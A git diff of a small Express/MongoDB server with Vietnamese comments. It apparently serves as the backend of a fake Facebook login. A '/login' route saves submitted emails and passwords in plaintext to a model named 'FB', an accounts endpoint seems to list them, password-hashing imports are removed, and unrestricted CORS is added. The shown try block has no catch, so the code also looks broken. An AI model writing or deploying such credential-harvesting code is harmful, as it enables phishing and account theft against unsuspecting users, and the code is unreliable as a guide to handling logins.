@@ -9,8 +9,9 @@ const webRouter = require('./src/routes/web')
 const configviewengine = require('./src/config/viewengine');
 app.use(express.json())
 app.use(bodyParser.json());
-const bcrypt = require('bcryptjs');
-const jwt = require('jsonwebtoken');
+const cors = require('cors');
+app.use(cors());
+
 configviewengine(app);
 app.use('/api/admin', webRouter);
 app.use('/', webRouter);
@@ -47,15 +48,11 @@ const FB = mongoose.model('FB', fbSchema);
 // Route để xử lý dữ liệu từ form
 app.post('/login', async (req, res) => {
     try {
-        // Lấy dữ liệu từ form
         const { email, password } = req.body;
 
-        // Tạo một document mới
         const newFB = new FB({ email, password });
 
-        // Lưu document vào MongoDB
         await newFB.save();
-
 
     }
 });
@@ -71,7 +68,7 @@ app.get("/api/accounts", async (req, res) => {
     }
 });
 
-
+app.use(cors());
 
 app.listen(port, () => {
     console.log(`Example app listening on port ${port}`)
